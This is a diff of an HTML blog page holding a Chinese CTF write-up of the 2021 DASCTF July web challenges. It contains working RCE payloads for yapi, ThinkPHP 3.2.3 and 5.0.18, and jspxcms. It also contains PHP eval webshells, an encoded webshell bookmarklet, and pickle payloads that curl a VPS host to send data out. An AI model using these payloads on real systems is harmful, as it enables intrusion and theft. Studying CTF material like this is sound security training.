@@ -527,9 +527,8 @@
                 <blockquote>
 <p>本文首发于安全客：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252295">https://www.anquanke.com/post/id/252295</a></p>
 </blockquote>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810013105945.png" alt=""></p>
-<h2 id="引言">引言</h2>
-<blockquote>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810013105945.png"></p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
 <p><strong>2021DASCTF 实战精英夏令营预热赛暨 DASCTF July X CBCTF 4th</strong></p>
 <p>比赛时间：2021年7月31日 10:00 - 8月1日 18:00</p>
 <p><a target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/15/challenges">https://buuoj.cn/match/matches/15/challenges</a></p>
@@ -540,9 +539,7 @@
 <p>不过看了几题 web 发现有不少是复现漏洞或者自己挖洞的题，寻思着还有点味道，赛后又来复现了一下。</p>
 <p>主要看的是 Web 和 Misc 题目，这篇大部分是边做边写的，写得还是挺详细的吧，当然也少不了走弯路的地方。</p>
 <p>大师傅们随便看看就好了（</p>
-<h2 id="Web">Web</h2>
-<h3 id="ezrce">ezrce</h3>
-<blockquote>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><blockquote>
 <p>你真的会 nodejs 吗？</p>
 </blockquote>
 <p>参考 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/388742545">yapi远程代码执行漏洞复现（部署+复现）</a></p>
@@ -553,12 +550,11 @@
 <span class="token keyword">const</span> test <span class="token operator">=</span> <span class="token function">FunctionConstructor</span><span class="token punctuation">(</span><span class="token string">'return process'</span><span class="token punctuation">)</span>
 <span class="token keyword">const</span> process <span class="token operator">=</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 mockJson <span class="token operator">=</span> process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"whoami &amp;&amp; ps -ef &amp;&amp; ls -al /&amp;&amp; cat /ffffffflllllaggggg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210731235223928.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210731235223928.png"></p>
 <p>再点击这个预览的地址即可。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210731235254037.png" alt=""></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210731234854458.png" alt=""></p>
-<h3 id="cat-flag">cat flag</h3>
-<blockquote>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210731235254037.png"></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210731234854458.png"></p>
+<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h3><blockquote>
 <p>简简单单cat flag</p>
 <p>Hint: 管理员曾访问过flag</p>
 </blockquote>
@@ -639,25 +635,25 @@ BUG_REPORT_URL="https://bugs.alpinelinux.org/"<span aria-hidden="true" class="li
 ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>所以文件是 <code>this_is_final_flag_e2a457126032b42d.php</code>，不过包含了 <code>flag</code>。</p>
 <p>参考 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.escapeshellarg.php">https://www.php.net/manual/zh/function.escapeshellarg.php</a></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210807223807218.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210807223807218.png"></p>
 <p>可以加个非 ASCII 码字符绕过 <code>escapeshellarg</code>，测试发现 <code>%80</code> 及以上都行。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801160632109.png" alt=""></p>
-<h3 id="easythinkphp">easythinkphp</h3>
-<p>ThinkPHP V3.2.3</p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801160632109.png"></p>
+<h3 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h3><p>ThinkPHP V3.2.3</p>
 <p>直接现成工具一把梭</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801163645281.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801163645281.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">http://xxxxxxxxxx/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_08_01.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>原理可参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sevck/p/15012267.html">炒冷饭之ThinkPHP3.2.X RCE漏洞分析</a></p>
 <p>大概就是先写个带有一句话木马的报错语句到日志里，然后文件包含来执行命令。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801163718160.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801163718160.png"></p>
 <p>另外还有其他师傅说其实可以直接文件包含来读 <code>/flag</code>.</p>
 <pre class="line-numbers language-none"><code class="language-none">m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="jspxcms">jspxcms</h3>
-<p>后台</p>
+
+
+<h3 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h3><p>后台</p>
 <p><a target="_blank" rel="noopener" href="http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/cmscp/index.do">http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/cmscp/index.do</a></p>
 <p>默认登录信息 admin / 空</p>
 <p>Jspxcms v9.5.1</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801171257453.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801171257453.png"></p>
 <p>参考 <a target="_blank" rel="noopener" href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">复现jspxcms解压getshell漏洞</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188788">记一次由追踪溯源发现的“不安全解压getshell”</a></p>
 <p>unzip 方法未对 ZIP 压缩包里的文件名进行参数校验，就进行文件的写入，构造带有 <code>../</code> 的文件名就能构成目录穿越漏洞。</p>
@@ -673,25 +669,24 @@ z <span class="token operator">=</span> zipfile<span class="token punctuation">.
 z<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">'../../../shell.war'</span><span class="token punctuation">,</span>temp<span class="token punctuation">)</span>  <span class="token comment">#shell.war为上一步生产的后门war包</span>
 z<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>通过 上传文件 上传压缩包，然后 zip解压 部署上去。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210802214548052.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210802214548052.png"></p>
 <p><a target="_blank" rel="noopener" href="http://xxxxxxxxxxxx/shell/shell.jsp">http://xxxxxxxxxxxx/shell/shell.jsp</a></p>
 <p>冰蝎成功连上</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210802214006333.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210802214006333.png"></p>
 <p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210802213935760.png" alt="flag"></p>
 <p>可以看到本来上传的目录是 <code>uploads/1/</code>，通过目录穿越解压到了上级的 <code>tomcat/webapps</code> 目录下了。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210802220146964.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210802220146964.png"></p>
 <p>当然这里也可以参考 <a target="_blank" rel="noopener" href="http://www.snowywar.top/?p=2424#wznav_1">雪姐姐的办法</a>，直接新建个页面，通过 JavaScript 写入个简单的调试页面，直接在浏览器里执行命令、上传文件。</p>
 <p>新建个书签，然后直接在 shell 的页面加载书签。</p>
 <pre class="line-numbers language-none"><code class="language-none">javascript:{window.localStorage.embed=window.atob("ZG9jdW1lbnQud3JpdGUoIjxwPiIpOw0KdmFyIGh0bWwgPSAiPGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSdjbWQuanNwJz5cDQo8aW5wdXQgbmFtZT0nYycgdHlwZT10ZXh0PjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz5cDQo8L2Zvcm0+PGhyPlwNCjxmb3JtIGFjdGlvbj0nY21kLmpzcCcgbWV0aG9kPXBvc3Q+XA0KVXBsb2FkIGRpcjogPGlucHV0IG5hbWU9J2EnIHR5cGU9dGV4dCB2YWx1ZT0nLic+PGJyPlwNClNlbGVjdCBhIGZpbGUgdG8gdXBsb2FkOiA8aW5wdXQgbmFtZT0nbicgdHlwZT0nZmlsZScgaWQ9J2YnPlwNCjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2InIGlkPSdiJz5cDQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz5cDQo8L2Zvcm0+PGhyPiI7DQp2YXIgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQpkaXYuaW5uZXJIVE1MID0gaHRtbDsNCmRvY3VtZW50LmJvZHkuaW5zZXJ0QmVmb3JlKGRpdiwgZG9jdW1lbnQuYm9keS5maXJzdENoaWxkKTsNCg0KdmFyIGhhbmRsZUZpbGVTZWxlY3QgPSBmdW5jdGlvbihldnQpIHsNCiAgICB2YXIgZmlsZXMgPSBldnQudGFyZ2V0LmZpbGVzOw0KICAgIHZhciBmaWxlID0gZmlsZXNbMF07DQoNCiAgICBpZiAoZmlsZXMgJiYgZmlsZSkgew0KICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCg0KICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24ocmVhZGVyRXZ0KSB7DQogICAgICAgICAgICB2YXIgYmluYXJ5U3RyaW5nID0gcmVhZGVyRXZ0LnRhcmdldC5yZXN1bHQ7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYicpLnZhbHVlID0gYnRvYShiaW5hcnlTdHJpbmcpOw0KICAgICAgICB9Ow0KDQogICAgICAgIHJlYWRlci5yZWFkQXNCaW5hcnlTdHJpbmcoZmlsZSk7DQogICAgfQ0KfTsNCmlmICh3aW5kb3cuRmlsZSAmJiB3aW5kb3cuRmlsZVJlYWRlciAmJiB3aW5kb3cuRmlsZUxpc3QgJiYgd2luZG93LkJsb2IpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGhhbmRsZUZpbGVTZWxlY3QsIGZhbHNlKTsNCn0gZWxzZSB7DQogICAgYWxlcnQoJ1RoZSBGaWxlIEFQSXMgYXJlIG5vdCBmdWxseSBzdXBwb3J0ZWQgaW4gdGhpcyBicm93c2VyLicpOw0KfQ==");eval(window.localStorage.embed);};void(0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>不过这个 shell 估计是个简单的小马，不带加密的，文件名是 <code>cmd.jsp</code>，执行命令的密码 <code>c</code>。需要的话可以自己改一下。</p>
-<h3 id="jj’s-camera">jj’s camera</h3>
-<blockquote>
+<h3 id="jj’s-camera"><a href="#jj’s-camera" class="headerlink" title="jj’s camera"></a>jj’s camera</h3><blockquote>
 <p>jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点</p>
 <p>Hint: 网上能搜到源码，仅修改了前端ui，注意服务器的响应</p>
 </blockquote>
 <p>是个会自动抓拍然后上传后端并 302 跳转到任意 url 的网站。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801205130959.png" alt=""></p>
-<p>根据 /sc.php?id=miao&amp;url=http://baidu.com 以及页面上的代码</p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801205130959.png"></p>
+<p>根据 /sc.php?id=miao&amp;url=<a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 以及页面上的代码 </p>
 <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
@@ -793,7 +788,7 @@ z<span class="token punctuation">.</span>close<span class="token punctuation">(<
 <p>这里的 <code>$type</code> 是从 post 参数里的 <code>image/(\w+)</code> 来的，但是限制了只能是 <code>bmp</code> 或者 <code>png</code>，绕不过也不可控。</p>
 <p>再看 <code>$new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type;</code> 这句，这个 <code>$id</code> 从 GET 参数来的，是可控的。</p>
 <p>但是为了上传使得后缀名为 <code>.php</code>，那就需要 <strong>搭配 <code>%00</code> 截断</strong>。</p>
-<p><s>试了老半天发现还不行最后发现漏看了个 <code>trim</code>（别骂了别骂了</s></p>
+<p><del>试了老半天发现还不行最后发现漏看了个 <code>trim</code>（别骂了别骂了</del></p>
 <p>由于这个 <code>trim</code> 函数会把字符串首尾的空字符给去除，于是就得加个其他的字符包裹一下 <code>%00</code>.</p>
 <p>构造 id 为 <code>miao.php%00.</code>，上传的文件内容是 base64 encode + urlencode 后的一句话木马。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -819,8 +814,10 @@ z<span class="token punctuation">.</span>close<span class="token punctuation">(<
 <span class="token header-name keyword">Connection:</span> close
 
 img=data%3aimage/png%3bbase64,PD9waHAgQGV2YWwoJF9SRVFVRVNUWydtJ10pOz8%2b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
 <p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801225324211.png" alt="phpinfo"></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801225430304.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801225430304.png"></p>
 <blockquote>
 <p><strong>Extensive reading:</strong></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/179401.html">挖洞姿势 | 深度聊聊PHP下的“截断”问题</a></p>
@@ -831,15 +828,13 @@ img=data%3aimage/png%3bbase64,PD9waHAgQGV2YWwoJF9SRVFVRVNUWydtJ10pOz8%2b<span ar
 <li>php的magic_quotes_gpc为OFF状态</li>
 </ol>
 </blockquote>
-<h3 id="cybercms">cybercms</h3>
-<blockquote>
+<h3 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h3><blockquote>
 <p>赛博CMS，只为安全而生</p>
 <p>Hint: 信息搜集是一个web手必备的技能</p>
 </blockquote>
 <p><strong>详见另一篇博客：</strong></p>
 <p><a href="https://miaotony.xyz/2021/08/10/CTF_2021DASCTF_July_cybercms/">CTF | 2021 DASCTF July cybercms 一探再探</a></p>
-<h3 id="easyweb">easyweb</h3>
-<p>题目给了 dockerfile 及后端源码。</p>
+<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>题目给了 dockerfile 及后端源码。</p>
 <p><code>app.py</code></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hypercorn<span class="token punctuation">.</span>middleware <span class="token keyword">import</span> DispatcherMiddleware
 <span class="token keyword">from</span> vuln_app <span class="token keyword">import</span> vuln_app
@@ -914,23 +909,25 @@ CMD nginx &amp;&amp; useradd ctf &amp;&amp; su ctf -c 'hypercorn  --bind 0.0.0.0
 <p>flag 要通过执行 <code>/readflag</code> 来获得。</p>
 <p><code>app.py</code> 里注册了两个路由，根目录访问的是 <code>simple_app</code>，看上去没啥问题，主要还是 <code>/vuln</code> 下访问的 <code>vuln_app</code>，其中用到了 <code>PickleSerializer</code>，盲猜就有 pickle 序列化在里面了。</p>
 <p>直接打上断点，跟一波 debug，成功发现了 <code>pickle.loads</code>。在设置 session 时先从请求获取 session，而后再设置新的 session。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805214637305.png" alt=""></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805215139127.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805214637305.png"></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805215139127.png"></p>
 <p>从 cookie 里取出 session，进行 urlsafe_b64decode，再截取出 <code>cstruct</code> 和签名 <code>expected_sig</code>，进行校验后对 <code>cstruct</code> 再一次 urlsafe_b64decode，最后调用 <code>pickle.loads</code>。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805214602122.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805214602122.png"></p>
 <p>设置 cookie 的操作在 <code>Response</code> 时进行，最终会调用上图的 <code>pickle.dumps</code>。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805221812370.png" alt=""></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805221717283.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805221812370.png"></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805221717283.png"></p>
 <p>做题的话，可以直接改最后这个 <code>pickle.dumps</code> 结果为构造好的 pickle payload。</p>
 <p>可以参考 <a href="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#opcode">2021 巅峰极客网络安全技能挑战赛 opcode 一题</a>，比如</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">b"(cos\nsystem\nS\'curl http://VPS:PORT/?flag=`/readflag`\'\no."</span>
 <span class="token comment"># or</span>
 <span class="token string">b'cposix\nsystem\nX3\x00\x00\x00curl http://VPS:PORT/`readflag | base64`\x85R.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210806015555979.png" alt=""></p>
+
+
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210806015555979.png"></p>
 <p>然后本地起服务，浏览器里请求一下，把 cookie 复制一下，把这个作为 payload 赋值给远程的 cookie 就完事了。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210806015742107.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210806015742107.png"></p>
 <p>访问 <a target="_blank" rel="noopener" href="http://xxxxxxxxx/vuln%EF%BC%8C%E4%BF%AE%E6%94%B9">http://xxxxxxxxx/vuln，修改</a> cookie，刷新页面，vps 上起个 web 服务监听，拿到 flag 完事。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210806015834114.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210806015834114.png"></p>
 <hr>
 <p>或者参考大师傅更方便的方法，可以直接改后端代码，直接设置个新的 session 实例化一个 RCE 对象。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Miao</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -945,28 +942,26 @@ CMD nginx &amp;&amp; useradd ctf &amp;&amp; su ctf -c 'hypercorn  --bind 0.0.0.0
     <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>session<span class="token punctuation">)</span>
     <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Hello World!'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>本地调试可以发现第一次访问会设置上 session，第二次访问的时候就会反序列化 pickle 执行 payload 了。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805230352431.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210805230352431.png"></p>
 <p>本地起个原始的 app，改好 cookie，刷新页面就能打通了。</p>
 <p>嗯很好，远程没打通！</p>
 <p>重试了几次，还是没成功……</p>
 <p>最后寻思着是不是那个 pickle 序列化时候和操作系统有关啊？</p>
 <p>换到 kali 下起 web 服务，生成 payload 再扔到远程去，这回成功了……</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810000849694.png" alt=""></p>
-<h3 id="ez-website">ez_website</h3>
-<blockquote>
-<p>简单的题目</p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810000849694.png"></p>
+<h3 id="ez-website"><a href="#ez-website" class="headerlink" title="ez_website"></a>ez_website</h3><blockquote>
+<p>简单的题目 </p>
 <p><a target="_blank" rel="noopener" href="https://dasctf-july-1251267611.file.myqcloud.com/ez_website.zip">https://dasctf-july-1251267611.file.myqcloud.com/ez_website.zip</a></p>
 </blockquote>
 <p>给了源码，齐博X1.0，基于ThinkPHP V5.0.18 二次开发的。</p>
 <p><a target="_blank" rel="noopener" href="http://xxxxxxxxx/admin.php/admin/index/index.html">http://xxxxxxxxx/admin.php/admin/index/index.html</a></p>
 <p>后台弱密码 admin/admin888</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810024031700.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810024031700.png"></p>
 <p>不过后台上传貌似不行，sql 执行开启了 <code>--secure-file-priv</code>，不能写入文件。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810044029884.png" alt=""></p>
-<h4 id="打法1-前台反序列化-RCE">打法1 前台反序列化 RCE</h4>
-<p>这里复现，主要参考 <a target="_blank" rel="noopener" href="https://ma4ter.cn/2527.html">齐博建站系统x1.0代码审计</a></p>
+<p> <img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810044029884.png"></p>
+<h4 id="打法1-前台反序列化-RCE"><a href="#打法1-前台反序列化-RCE" class="headerlink" title="打法1 前台反序列化 RCE"></a>打法1 前台反序列化 RCE</h4><p>这里复现，主要参考 <a target="_blank" rel="noopener" href="https://ma4ter.cn/2527.html">齐博建站系统x1.0代码审计</a></p>
 <p>有一处前台反序列化的地方 <code>application\index\controller\Labelmodels.php</code></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810025207826.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810025207826.png"></p>
 <p>直接拿文章里面的现成 exp 来打了。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span> <span class="token punctuation">{</span>
@@ -1087,7 +1082,7 @@ CMD nginx &amp;&amp; useradd ctf &amp;&amp; su ctf -c 'hypercorn  --bind 0.0.0.0
     <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$window</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <pre class="line-numbers language-none"><code class="language-none">http://xxxxxxx/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A122%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810031705075.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810031705075.png"></p>
 <p>看起来已经走过反序列化这条语句了，执行成功了。</p>
 <p>木马的文件名是 <code>a.php</code> 加上 <code>var_dump(md5('tag_'.md5('xxx')));</code> 的结果，也就是 <code>a.php12ac95f1498ce51d2d96a249c09c1998.php</code></p>
 <p>然而直接访问根目录下的这个文件 404 了……</p>
@@ -1096,30 +1091,30 @@ CMD nginx &amp;&amp; useradd ctf &amp;&amp; su ctf -c 'hypercorn  --bind 0.0.0.0
 <p>改一改 payload，写入到 runtime 目录下。记得改长度。</p>
